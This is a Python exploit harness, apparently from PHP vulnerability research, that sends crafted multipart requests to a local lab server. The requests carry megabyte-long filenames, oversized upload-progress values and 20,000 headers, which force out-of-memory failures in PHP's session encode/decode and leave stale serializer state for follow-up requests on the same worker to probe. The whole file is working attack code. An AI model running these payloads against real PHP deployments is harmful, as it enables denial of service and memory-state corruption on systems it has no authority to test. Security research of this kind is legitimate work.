#!/usr/bin/env python3
"""619 fire v2 at 8083 - STOCK-limit-compatible producer shapes.
Producers:
  ENC  : SID+key + file part with ~1MB filename -> OOM inside first update's
         php_session_encode (progress data holds the 1MB name) -> BG(serialize) stale
  DEC  : (prefill) SID2+key + file part w/ 600KB filename, request completes,
         session file ~600KB; (producer) same SID2 + key + tiny file ->
         OOM inside php_session_decode -> BG(unserialize) stale
  HDR  : 20k tiny headers on one part -> OOM in parser (control; BG clean)
  PROGV: 1MB progress value -> OOM in FORMDATA handler (control; BG clean)
Consumers (same worker, keep-alive): PROG multipart / GET / PLAIN multipart.
Worker identity via ?probe=base bias."""
import socket, sys, json, time

HOST, PORT = "127.0.0.1", 8083
B = b"GLM619"

def part(name, body, filename=None):
    d = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        d += b'; filename="' + filename + b'"'
    return b"--" + B + b"\r\n" + d + b"\r\nContent-Type: text/plain\r\n\r\n" + body + b"\r\n"

def pb(parts):
    return b"".join(parts) + b"--" + B + b"--\r\n"

def post_head(blen, keep=True):
    return (f"POST /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {blen}\r\n"
            + ("Connection: keep-alive\r\n\r\n" if keep else "Connection: close\r\n\r\n")).encode()

class KA:
    """keep-alive connection; requests pipelined one at a time; split responses"""
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=20)
        self.buf = b""
    def send(self, head, body=None, timeout=150):
        self.s.sendall(head if body is None else head + body)
        self.s.settimeout(timeout)
        # read until a complete HTTP response (by Content-Length) or EOF/timeout
        self.buf = b""
        while True:
            head_end = self.buf.find(b"\r\n\r\n")
            if head_end >= 0:
                head = self.buf[:head_end]
                m = None
                import re
                m = re.search(rb"Content-Length: (\d+)", head)
                if m:
                    need = head_end + 4 + int(m.group(1))
                    if len(self.buf) >= need:
                        return self.buf[:need]
            try:
                d = self.s.recv(65536)
            except socket.timeout:
                return self.buf + b"\n<TIMEOUT>"
            except ConnectionResetError:
                return self.buf + b"\n<RESET>"
            if not d:
                return self.buf + b"\n<EOF>"
            self.buf += d
    def close(self):
        try: self.s.close()
        except Exception: pass

def bias():
    r = None
    try:
        s = socket.create_connection((HOST, PORT), timeout=10)
        s.sendall(b"GET /lab/index.php?probe=base HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n")
        s.settimeout(20)
        out = b""
        while True:
            d = s.recv(65536)
            if not d: break
            out += d
        s.close()
        r = out.split(b"\r\n\r\n", 1)[1].strip() if b"\r\n\r\n" in out else out
    except Exception as e:
        r = f"ERR:{type(e).__name__}".encode()
    return r

def show(tag, r):
    i = r.find(b"\r\n\r\n")
    head, body = r[:i], r[i+4:] if i >= 0 else (r, b"")
    print(f"  {tag}: len={len(r)} body[:180]={body[:180]!r}", flush=True)
    return body

def progress_parts(sid):
    return [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
            part(b"u", b"y", filename=b"a.txt")]

case = sys.argv[1]
ka = KA()
b0 = bias()
print(f"[{case}] bias BEFORE: {b0!r}", flush=True)

def fire_seq(name, reqs):
    for tag, head, body in reqs:
        r = ka.send(head, body)
        show(f"{name}/{tag}", r)

if case == "ENC":
    sid = "e" * 32
    prod = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
            part(b"u", b"y", filename=b"F" * (1024 * 1024))]
    cons = progress_parts(sid)
    p, c = pb(prod), pb(cons)
    fire_seq("ENC", [("producer", post_head(len(p)), p), ("consumer-PROG", post_head(len(c)), c)])
elif case == "DEC":
    sid = "d" * 32
    pre = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
           part(b"u", b"y", filename=b"P" * (600 * 1024))]
    prod = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
            part(b"u", b"y", filename=b"t.txt")]
    cons = progress_parts(sid)
    p0, p1, c = pb(pre), pb(prod), pb(cons)
    fire_seq("DEC", [("prefill600K", post_head(len(p0)), p0), ("producer-decode-OOM", post_head(len(p1)), p1),
                     ("consumer-PROG", post_head(len(c)), c)])
elif case == "HDR":
    hdrs = b"".join(f"X-{i}: v\r\n".encode() for i in range(20000))
    prod = [b"--" + B + b"\r\n" + hdrs + b"Content-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n"]
    sid = "h" * 32
    cons = progress_parts(sid)
    p, c = pb(prod), pb(cons)
    fire_seq("HDR", [("producer-hdr-OOM", post_head(len(p)), p), ("consumer-PROG", post_head(len(c)), c)])
elif case == "PROGV":
    sid = "v" * 32
    prod = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"K" * (1024 * 1024)),
            part(b"u", b"", filename=b"f.txt")]
    cons = progress_parts(sid)
    p, c = pb(prod), pb(cons)
    fire_seq("PROGV", [("producer-value-OOM", post_head(len(p)), p), ("consumer-PROG", post_head(len(c)), c)])
elif case == "ENC-GET":
    sid = "g" * 32
    prod = [part(b"PHPSESSID", sid.encode()), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k"),
            part(b"u", b"y", filename=b"F" * (1024 * 1024))]
    p = pb(prod)
    fire_seq("ENC-GET", [("producer", post_head(len(p)), p),
                         ("consumer-GET", b"GET /lab/index.php HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: keep-alive\r\n\r\n", None)])

ka.close()
b1 = bias()
print(f"[{case}] bias AFTER: {b1!r}", flush=True)
print(f"[{case}] SAME_WORKER={b0 == b1}", flush=True)
